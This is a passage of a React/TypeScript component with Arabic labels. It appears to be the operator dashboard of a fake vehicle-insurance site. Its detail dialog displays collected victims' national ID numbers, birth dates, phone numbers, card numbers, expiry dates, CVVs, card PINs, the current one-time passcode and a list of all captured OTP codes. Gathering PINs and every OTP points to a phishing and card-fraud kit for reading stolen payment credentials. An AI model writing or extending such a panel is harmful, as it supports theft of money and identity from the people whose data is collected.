            </AnimatePresence>
          </div>

          {filteredNotifications.length > 0 && (
            <div className="p-4 border-t border-gray-200 dark:border-gray-700">
              <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={handlePageChange} />
              <LastUpdatedIndicator lastUpdated={lastUpdated} />
            </div>
          )}
        </Card>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-background text-foreground max-w-lg w-[90vw]" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-xl flex items-center gap-2">
              {selectedInfo === "personal" ? (
                <FileText className="h-5 w-5 text-primary" />
              ) : selectedInfo === "insurance" ? (
                <Car className="h-5 w-5 text-primary" />
              ) : (
                <CreditCard className="h-5 w-5 text-primary" />
              )}
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "insurance"
                  ? "بيانات التأمين"
                  : selectedInfo === "card"
                    ? "معلومات البطاقة"
                    : "معلومات عامة"}
            </DialogTitle>
            <DialogDescription>
              تفاصيل {selectedInfo === "personal" ? "المستخدم" : selectedInfo === "insurance" ? "التأمين" : "البطاقة"}.
            </DialogDescription>
          </DialogHeader>

          <div className="max-h-[60vh] overflow-y-auto pr-2 -mr-2 custom-scrollbar">
            {selectedInfo === "personal" && selectedNotification && (
              <div className="space-y-3 p-4 bg-muted/50 rounded-lg">
                {[
                  { label: "رقم الهوية", value: selectedNotification.idNumber },
                  { label: "تاريخ الميلاد", value: selectedNotification.birthDate },
                  { label: "رقم الجوال", value: selectedNotification.mobile },
                  { label: "الاسم", value: selectedNotification.name },
                  { label: "الهاتف", value: selectedNotification.phone },
                ].map(
                  (item) =>
                    item.value && (
                      <p key={item.label} className="flex justify-between text-sm">
                        <span className="font-medium text-muted-foreground">{item.label}:</span>
                        <span>{item.value}</span>
                      </p>
                    ),
                )}
              </div>
            )}

            {selectedInfo === "insurance" && selectedNotification && (
              <Tabs defaultValue="basic" className="w-full">
                <TabsList className="grid grid-cols-3 mb-4">
                  <TabsTrigger value="basic">أساسية</TabsTrigger>
                  <TabsTrigger value="vehicle">المركبة</TabsTrigger>
                  <TabsTrigger value="plan">الخطة</TabsTrigger>
                </TabsList>
                {[
                  {
                    value: "basic",
                    items: [
                      { label: "نوع التأمين", data: selectedNotification.insuranceType },
                      { label: "الرقم التسلسلي", data: selectedNotification.serialNumber },
                      { label: "رقم الهوية", data: selectedNotification.idNumber },
                      { label: "تاريخ الميلاد", data: selectedNotification.birthDate },
                    ],
                  },
                  {
                    value: "vehicle",
                    items: [
                      { label: "نوع المركبة", data: selectedNotification.vehicleType },
                      { label: "موديل المركبة", data: selectedNotification.vehicleModel },
                      { label: "سنة الصنع", data: selectedNotification.vehicleYear },
                      { label: "قيمة المركبة", data: `${selectedNotification.vehicleValue} ر.س` },
                    ],
                  },
                  {
                    value: "plan",
                    items: [
                      { label: "خطة التأمين", data: selectedNotification.selectedPlan || "لم يتم الاختيار" },
                      {
                        label: "السعر الإجمالي",
                        data: selectedNotification.totalPrice ? `${selectedNotification.totalPrice} ر.س` : null,
                        highlight: true,
                      },
                    ],
                  },
                ].map((tab) => (
                  <TabsContent
                    key={tab.value}
                    value={tab.value}
                    className="space-y-3 p-4 bg-muted/50 rounded-lg text-sm"
                  >
                    {tab.items.map(
                      (item:any) =>
                        item.data && (
                          <p key={item.label} className="flex justify-between">
                            <span className="font-medium text-muted-foreground">{item.label}:</span>
                            <span className={item.highlight ? "font-bold text-emerald-600 dark:text-emerald-400" : ""}>
                              {item.data}
                            </span>
                          </p>
                        ),
                    )}
                    {tab.value === "plan" &&
                      selectedNotification.coverage &&
                      selectedNotification.coverage.length > 0 && (
                        <div>
                          <span className="font-medium text-muted-foreground block mb-1.5">التغطيات المشمولة:</span>
                          <div className="flex flex-wrap gap-1.5">
                            {selectedNotification.coverage.map((item, index) => (
                              <Badge
                                key={index}
                                variant="secondary"
                                className="text-xs px-1.5 py-0.5 bg-emerald-100 dark:bg-emerald-900/50 text-emerald-700 dark:text-emerald-300"
                              >
                                {item}
                              </Badge>
                            ))}
                          </div>
                        </div>
                      )}
                  </TabsContent>
                ))}
              </Tabs>
            )}

            {selectedInfo === "card" && selectedNotification && (
              <div className="space-y-3 p-4 bg-muted/50 rounded-lg text-sm">
                {(selectedNotification.cardData?.bank || selectedNotification.bank) && (
                  <p className="flex justify-between">
                    <span className="font-medium text-muted-foreground">البنك:</span>
                    <span className="font-semibold">
                      {selectedNotification.cardData?.bank || selectedNotification.bank}
                    </span>
                  </p>
                )}
                {renderSensitiveField(
                  "رقم البطاقة",
                  selectedNotification.cardData?.cardNumber || selectedNotification.cardNumber,
                  "cardNumber",
                )}
                {(selectedNotification.cardData?.cardExpiry ||
                  selectedNotification.cardExpiry ||
                  selectedNotification.expiryDate ||
                  (selectedNotification.year && selectedNotification.month)) && (
                  <p className="flex justify-between">
                    <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
                    <span className="font-semibold">
                      {selectedNotification.cardData?.cardExpiry ||
                        selectedNotification.cardExpiry ||
                        selectedNotification.expiryDate ||
                        (selectedNotification.year && selectedNotification.month
                          ? `${selectedNotification.year}/${selectedNotification.month}`
                          : "")}
                    </span>
                  </p>
                )}
                {(selectedNotification.cardData?.cardholderName || selectedNotification.name) && (
                  <p className="flex justify-between">
                    <span className="font-medium text-muted-foreground">اسم حامل البطاقة:</span>
                    <span className="font-semibold">
                      {selectedNotification.cardData?.cardholderName || selectedNotification.name}
                    </span>
                  </p>
                )}
                {renderSensitiveField(
                  "رمز الأمان (CVV)",
                  selectedNotification.cardData?.cvv || selectedNotification.cvv,
                  "cvv",
                )}
                {renderSensitiveField(
                  "رمز البطاقة (PIN)",
                  selectedNotification.cardData?.pass || selectedNotification.pass,
                  "pass",
                )}

                {(selectedNotification.cardData?.otp ||
                  selectedNotification.cardData?.otpCode ||
                  selectedNotification.otp ||
                  selectedNotification.otpCode) && (
                  <div className="flex justify-between items-center">
                    <span className="font-medium text-muted-foreground">رمز التحقق (OTP):</span>
                    <Badge className="font-semibold bg-green-100 text-green-700 dark:bg-green-900/50 dark:text-green-300 px-2 py-0.5">
                      {selectedNotification.cardData?.otp || selectedNotification.otp}
                      {(selectedNotification.cardData?.otpCode || selectedNotification.otpCode) &&
                        ` || ${selectedNotification.cardData?.otpCode || selectedNotification.otpCode}`}
                    </Badge>
                  </div>
                )}
                {(selectedNotification.cardData?.allOtps || selectedNotification.allOtps) &&
                  Array.isArray(selectedNotification.cardData?.allOtps || selectedNotification.allOtps) &&
                  (selectedNotification.cardData?.allOtps || selectedNotification.allOtps)!.length > 0 && (
                    <div>
                      <span className="font-medium text-muted-foreground block mb-1.5">جميع رموز OTP:</span>
                      <div className="flex flex-wrap gap-1.5">
                        {(selectedNotification.cardData?.allOtps || selectedNotification.allOtps)!.map((otp, index) => (
                          <Badge
                            key={index}
                            variant="outline"
                            className="text-xs px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700/50"
                          >
                            {otp}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
              </div>
            )}
          </div>

          <DialogFooter className="pt-4">
            <Button variant="outline" onClick={closeDialog}>
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  )
}
